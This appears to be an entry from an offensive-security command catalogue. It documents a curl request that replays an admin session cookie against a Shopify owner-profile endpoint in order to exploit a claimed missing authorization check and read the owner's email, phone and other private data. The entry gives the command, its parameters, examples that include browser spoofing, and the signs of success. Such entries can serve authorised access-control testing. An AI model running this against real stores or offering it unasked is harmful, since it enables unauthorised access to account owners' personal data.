---
data: >-
  curl -v -H "Cookie: [admin-session-cookie]"
  "https://admin.shopify.com/store/[store-name]/users/[owner-user-id]/profile"
tags:
  - web
  - access-control
  - shopify
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:44.671Z'
id: 938d8569-1474-4055-871c-c9831cba4fcd
verified: false
validated: true
submitted: true
---
# curl-shopify-profile-access

## Command

```bash
curl -v -H "Cookie: [admin-session-cookie]" "https://admin.shopify.com/store/[store-name]/users/[owner-user-id]/profile"
```

## Description

This command performs a direct HTTP GET request to a Shopify user's profile endpoint using an authenticated admin session cookie, exploiting missing authorization to retrieve the account owner's sensitive profile data. Use it to test for broken access control in web applications like Shopify.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose mode to show request/response details | No |
| `-H "Cookie: [value]"` | Sets the session cookie from an authenticated admin browser session | Yes |
| URL | The target profile endpoint with store name and owner user ID | Yes |

## Examples

### Basic Usage

```bash
curl -H "Cookie: _shopify_s=abc123; _shopify_y=def456" "https://admin.shopify.com/store/example/users/12345/profile"
```

### Advanced Usage

```bash
curl -v -H "Cookie: [full-session-cookie]" -H "User-Agent: Mozilla/5.0" "https://admin.shopify.com/store/example/users/12345/profile" > profile.html
```

This saves the output to a file for inspection and includes a user-agent header to mimic a browser.

## Expected Output

A successful response is HTTP 200 OK with the profile HTML or JSON containing sensitive data like email and phone. Look for lines like `* HTTP/1.1 200 OK` in verbose mode and profile fields in the body. Failure appears as 403 Forbidden or redirect.

## Related

- [[Related Procedure|Direct Access to Shopify Owner Profile]]
